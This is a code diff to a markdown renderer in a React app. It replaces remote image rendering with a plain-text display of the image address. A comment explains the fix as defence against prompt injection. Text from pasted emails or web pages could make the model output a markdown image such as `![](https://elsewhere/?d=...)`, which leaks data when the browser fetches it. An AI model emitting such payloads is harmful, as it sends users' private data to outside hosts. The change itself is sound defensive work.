@@ -192,11 +192,22 @@ function inline(token: Loose, query: string | null): ReactNode {
         </a>
       );
     }
+    /* A remote image is not rendered, and this is a security decision rather than a style one.
+       Item text, Ask answers and space briefs are all written by the model, and a capture can
+       carry text someone else wrote -- a pasted email, a web page. An injected
+       `![](https://elsewhere/?d=...)` would make the browser fetch that URL the moment the note
+       was displayed, which is a way for anything the model was shown to leave the device. The
+       address is shown instead, as text, so nothing loads until a human decides it should. */
     case "image": {
-      const src = safeHref(token.href ?? "");
       const alt = decodeEntities(token.text ?? "");
-      if (!src) return <>{alt}</>;
-      return <img src={src} alt={alt} loading="lazy" />;
+      const href = token.href ?? "";
+      if (!alt && !href) return <></>;
+      return (
+        <span className="image-ref">
+          {alt || "image"}
+          {href && <span className="muted"> ({href})</span>}
+        </span>
+      );
     }
     // Same rule as a block: the characters, never an element.
     case "html":
